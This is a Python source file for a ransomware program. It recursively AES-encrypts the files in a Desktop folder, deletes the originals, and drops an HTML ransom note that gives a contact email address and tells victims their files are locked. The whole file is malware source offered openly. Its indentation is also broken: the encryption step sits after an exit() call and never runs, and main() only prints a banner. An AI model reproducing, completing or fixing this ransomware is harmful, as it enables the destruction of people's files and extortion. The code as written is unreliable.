import  os
import hashlib

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import platform
from helpers import derive_key, TOKEN



def encrypt_data(data: bytes, token: str = TOKEN) -> bytes:
    """Encrypt the data using AES-256-CBC."""
    # Generate a random salt
    salt = os.urandom(16)
    
    # Derive a key from the password and salt
    key = derive_key(token, salt)
    
    # Generate a random initialization vector (IV)
    iv = os.urandom(16)
    
    # Create a Cipher object
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Pad the data to be a multiple of the block size
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    
    # Encrypt the data
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    
    print(f"Token used for encryption: {token}")
    # Return the salt, IV, and ciphertext concatenated together
    return salt + iv + ciphertext

def encrypt_file(file_path: str, token: str):
    """Encrypt and delete the file at the given path."""
    with open(file_path, 'rb') as f:
        file_data = f.read()

    # Encrypt the data
    encrypted_data = encrypt_data(file_data, token)

    # Save to a new .enc file
    enc_file_path = file_path + ".enc"
    with open(enc_file_path, 'wb') as f:
        f.write(encrypted_data)

    print(f"Encrypted: {file_path} -> {enc_file_path}")
    os.remove(file_path)
    print(f"Encrypted and deleted: {file_path} -> {enc_file_path}")

def encrypt_directory(directory: str, password: str):
    """Recursively encrypt all files in the given directory."""
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, password)
        create_ransom_note_webpage(directory)

def create_ransom_note_webpage(directory: str, token: str = TOKEN):
    """Create a ransom note webpage in the given directory."""
    ransom_note_content = """
    <html>
    <head><title>Ransom Note</title></head>
    <body>
        <h1> All of your files have been encrypted!</h1>
        <p>To unlock them, contact me with your encryption code at sheilafana21@gmail.com.</p>
        <p>Your encryption code is: {TOKEN}</p>
    </body>
    </html>
    """
    ransom_note_path = os.path.join(directory, "RANSOM_NOTE.html")
    with open(ransom_note_path, 'w') as f:
        f.write(ransom_note_content.format(TOKEN=token))

def main():
    ascii_art = """
      _____                                                                              
     |  __ \                                                                             
     | |__) |   __ _   _ __    ___    ___    _ __ ___   __      __   __ _   _ __    ___  
     |  _  /   / _` | | '_ \  / __|  / _ \  | '_ ` _ \  \ \ /\ / /  / _` | | '__|  / _ \ 
     | | \ \  | (_| | | | | | \__ \ | (_) | | | | | | |  \ V  V /  | (_| | | |    |  __/ 
     |_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
    """
    print(ascii_art)
 # Automatically detect OS and set target directory
target = os.path.join(os.path.expanduser("~"), "Desktop", "test")

if not os.path.exists(target):
    print("Folder does not exist.")
    exit()

    # Encrypt the target directory

    if os.path.isdir(target):
        encrypt_directory(target, TOKEN)
        create_ransom_note_webpage(target)
        print(f"Encryption complete. Ransom note created in: {target}")
    else:
        print(f"Target directory does not exist: {target}")

if __name__ == "__main__":
    main()                                           
